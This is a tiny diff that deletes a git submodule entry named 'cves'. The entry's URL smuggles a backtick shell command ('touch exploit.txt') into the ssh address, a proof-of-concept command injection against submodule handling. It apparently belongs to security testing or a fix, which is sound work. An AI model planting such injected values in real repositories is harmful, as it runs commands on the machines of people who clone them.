@@ -1,3 +1,0 @@
-[submodule "cves"]
-	path = cves
-	url = ssh://`touch exploit.txt`foo.example.com
